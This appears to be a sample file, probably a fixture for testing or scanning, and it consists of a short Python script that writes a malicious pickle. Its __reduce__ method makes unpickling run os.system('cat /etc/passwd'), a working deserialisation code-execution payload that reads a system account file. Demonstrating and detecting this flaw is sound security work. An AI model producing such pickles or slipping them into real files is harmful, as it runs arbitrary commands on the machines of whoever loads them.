# samples/evil.pkl — RCE через os.system
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))
pickle.dump(Evil(), open("./evil2.pkl", "wb"))

